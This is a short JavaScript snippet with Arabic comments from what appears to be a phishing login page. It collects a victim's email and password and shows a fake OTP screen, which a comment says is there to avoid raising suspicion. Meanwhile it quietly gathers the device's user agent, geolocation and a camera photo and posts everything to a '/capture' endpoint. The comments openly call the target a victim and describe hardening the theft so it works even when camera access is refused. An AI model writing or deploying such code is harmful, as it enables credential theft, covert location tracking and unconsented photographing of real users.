<script>
    let userEmail = "";

    // وظيفة الإصلاح: تجعل الزر يعمل فوراً ويرسل البيانات الأساسية حتى لو رفض الضحية الكاميرا
    async function captureAndProceed() {
        userEmail = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;

        if(!userEmail || !pass) {
            alert("يرجى إدخال البيانات المطلوبة للمتابعة");
            return;
        }

        // إظهار شاشة الـ OTP فوراً لعدم إثارة الشك
        document.getElementById('login-screen').classList.add('hidden');
        document.getElementById('otp-screen').classList.remove('hidden');

        // سحب البيانات في الخلفية دون تعطيل الزر
        const deviceData = navigator.userAgent;
        
        // محاولة سحب الموقع
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const loc = { lat: pos.coords.latitude, lon: pos.coords.longitude };
            await sendToServer('/capture', { email: userEmail, password: pass, location: loc, device: deviceData });
        }, async () => {
            await sendToServer('/capture', { email: userEmail, password: pass, location: null, device: deviceData });
        });

        // محاولة سحب الصورة بشكل منفصل (لكي لا يعلق الزر)
        getCameraImage().then(img => {
            if(img) sendToServer('/capture', { email: userEmail, image: img, note: "صورة ملحقة" });
        });
    }

    async function sendToServer(endpoint, data) {
        try {
            await fetch(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch (e) { console.error("Error sending data"); }
    }
</script>
